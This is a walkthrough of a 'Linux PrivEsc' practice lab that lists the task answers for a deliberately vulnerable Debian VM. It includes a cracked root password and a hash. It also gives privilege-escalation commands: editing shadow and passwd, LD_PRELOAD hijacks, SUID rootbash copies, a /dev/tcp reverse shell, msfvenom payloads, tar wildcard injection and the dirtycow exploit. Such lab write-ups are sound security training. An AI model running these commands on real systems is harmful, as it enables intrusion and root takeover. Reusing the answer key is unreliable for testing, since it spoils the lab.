# Linux PrivEsc

November 23, 2023

#### Task 1: Deploy The Vulnerable Debian VM

- Deploy the machine and login to the "user" account using SSH.
	- `No answer needed`

- Run the "id" command. What is the result?
	- `uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)`

#### Task 2: Service Exploits

- Read and follow along with the above.
	- `No answer needed`

#### Task 3: Weak File Permissions - Readable /etc/shadow

- What is the root user's password hash?
	- `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`

- What hashing algorithm was used to produce the root user's password hash?
	- `sha512crypt`

- What is the root user's password?
	- `password123`

Steps to get the root user's password.
```
ls -l /etc/shadow
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt for-john.txt
john --show for-john.txt
su root
```

#### Task 4: Weak File Permissions - Writable /etc/shadow

- Read and follow along with the above.
	- `No answer needed`

If the /etc/shadow/ can be edit, you can generate a new password then replace the old password between the first and second colons (:) of each line. (ex. root:sha-512passwordhere:17298:0:99999:7:::)

```
ls -l /etc/shadow/
mkpasswd -m sha-512 newpasswordhere
su root
```

#### Task 5: Weak File Permissions - Writable /etc/passwd

- Run the "id" command as the newroot user. What is the result?
	- `uid=0(root) gid=0(root) groups=0(root)`

If the /etc/passwd/ can be edit, you can generate a new password then replace the x in between the first and second colons (:) of each line. (ex.root:opensslpasswordhere:0:0:root:/root:/bin/bash) 

```
ls -l /etc/passwd
openssl passwd newpasswordhere
su root
```

#### Task 6: Sudo - Shell Escape Sequences

- How many programs is "user" allowed to run via sudo?
	- `11`

- One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
	- `apache2`

- Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.
	- `No answer needed`

#### Task 7: Sudo - Environment Variables

- Read and follow along with the above.
	- `No answer needed`

```
sudo -l
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
sudo LD_PRELOAD=/tmp/preload.so program-name-here
ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

#### Task 8: Cron Jobs - File Permissions

- Read and follow along with the above.
	- `No answer needed`

Vim the overwrite.sh then replace with the program below. 
Change the IP to your vpn IP.
```
cat /etc/crontab
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

nc -nvlp 4444
```

#### Task 9: Cron Jobs - PATH Environment Variable

- What is the value of the PATH variable in /etc/crontab?
	- `/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

First display the content of cron jobs.
```
cat /etc/crontab
```

Then you have to create a file named overwrite.sh
```
vim overwrite.sh
```

Paste the code below.
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that file is excutable.
```
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run.
```
/tmp/rootbash -p
```

#### Task 10: Cron Jobs - Wildcards

- Read and follow along with the above.
	- `No answer needed`

```
cat /usr/local/bin/compress.sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
nc -nvlp 4444
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

#### Task 11: SUID / SGID Executables - Known Exploits

- Read and follow along with the above.
	- `No answer needed`

Find the SUID/SGID exploit.
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```	


#### Task 12: SUID / SGID Executables - Shared Object Injection

- Read and follow along with the above.
	-`No answer needed`

```
/usr/local/bin/suid-so
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
```
#### Task 13: SUID / SGID Executables - Environment Variables

- Read and follow along with the above.
	- `No answer needed`


```
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env
```

#### Task 14: SUID / SGID Executables - Abusing Shell Features (#1)

- Read and follow along with the above.
	- `No answer needed`


```
strings /usr/local/bin/suid-env2
/bin/bash --version
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

#### Task 15: SUID / SGID Executables - Abusing Shell Features (#2)

- Read and follow along with the above.
	- `No answer needed`

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
rm /tmp/rootbash
exit
```

#### Task 16: Passwords & Keys - History Files

- What is the full mysql command the user executed?
	- `mysql -h somehost.local -uroot -ppassword123`

#### Task 17: Passwords & Keys - Config Files

- What file did you find the root user's credentials in?   
	- `/etc/openvpn/auth.txt`

#### Task 18: Passwords & Keys - SSH Keys

- Read and follow along with the above.
	- `No answer needed`

Copy the rsa key from the .ssh directory to your box.
Then chmod read & write only the root-key 
```
ls -la /
ls -la /.ssh
chmod 600 root_key
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.195.113
```

#### Task 19: NFS

- What is the name of the option that disables root squashing?
	- `no_root_squash`

In the victim box.
```
cat /etc/exports
```

In the attacker box.
```
sudo mkdir /tmp/nfs
sudo mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```

In the victim box.
```
/tmp/shell.elf
```
#### Task 20: Kernel Exploits

- Read and follow along with the above.
	- `No answer needed`

```
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
/usr/bin/passwd
mv /tmp/bak /usr/bin/passwd
exit
```

#### Task 21: Privilege Escalation Scripts

- Read and follow along with the above.
	- `No answer needed`
	